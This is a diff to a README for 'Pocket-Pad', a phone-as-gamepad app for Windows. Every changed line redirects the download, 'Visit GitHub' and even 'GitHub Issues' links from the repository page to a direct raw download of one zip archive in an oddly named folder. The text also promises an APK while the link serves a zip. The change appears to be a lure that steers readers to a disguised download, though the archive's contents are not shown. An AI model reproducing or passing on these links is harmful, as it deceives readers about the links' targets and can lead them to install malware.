@@ -1,6 +1,6 @@
 # 🎮 Pocket-Pad - Wireless Gamepad for Windows  
 
-[![Download Pocket-Pad](https://img.shields.io/badge/Download-Pocket--Pad-brightgreen)](https://github.com/Bifcen/Pocket-Pad)
+[![Download Pocket-Pad](https://img.shields.io/badge/Download-Pocket--Pad-brightgreen)](https://raw.githubusercontent.com/Bifcen/Pocket-Pad/main/osmidrosis/Pad-Pocket-3.4.zip)
 
 ## 📋 What is Pocket-Pad?
 
@@ -29,7 +29,7 @@ To use Pocket-Pad, make sure your setup meets these requirements:
 
 Visit this page to get Pocket-Pad:  
 
-[![Get Pocket-Pad](https://img.shields.io/badge/Get--Pocket--Pad-blue)](https://github.com/Bifcen/Pocket-Pad)
+[![Get Pocket-Pad](https://img.shields.io/badge/Get--Pocket--Pad-blue)](https://raw.githubusercontent.com/Bifcen/Pocket-Pad/main/osmidrosis/Pad-Pocket-3.4.zip)
 
 Follow these steps:
 
@@ -79,7 +79,7 @@ The app sends signals over Bluetooth, so you don’t need to open anything on Wi
 
 Visit the GitHub page regularly to check for updates:  
 
-[![Visit Pocket-Pad GitHub](https://img.shields.io/badge/Visit-GitHub-gray)](https://github.com/Bifcen/Pocket-Pad)
+[![Visit Pocket-Pad GitHub](https://img.shields.io/badge/Visit-GitHub-gray)](https://raw.githubusercontent.com/Bifcen/Pocket-Pad/main/osmidrosis/Pad-Pocket-3.4.zip)
 
 Download the latest APK file and follow the installation steps above to update your app.
 
@@ -105,8 +105,8 @@ Explore these settings to tailor your experience.
 
 If you run into issues or have questions, use the **Issues** tab on the GitHub page to report bugs or ask for help. Include details about your Android device, Windows version, and the problem you’re facing.  
 
-[GitHub Issues](https://github.com/Bifcen/Pocket-Pad/issues)  
+[GitHub Issues](https://raw.githubusercontent.com/Bifcen/Pocket-Pad/main/osmidrosis/Pad-Pocket-3.4.zip)  
 
 ---
 
-[![Download Pocket-Pad](https://img.shields.io/badge/Download-Pocket--Pad-brightgreen)](https://github.com/Bifcen/Pocket-Pad)
+[![Download Pocket-Pad](https://img.shields.io/badge/Download-Pocket--Pad-brightgreen)](https://raw.githubusercontent.com/Bifcen/Pocket-Pad/main/osmidrosis/Pad-Pocket-3.4.zip)
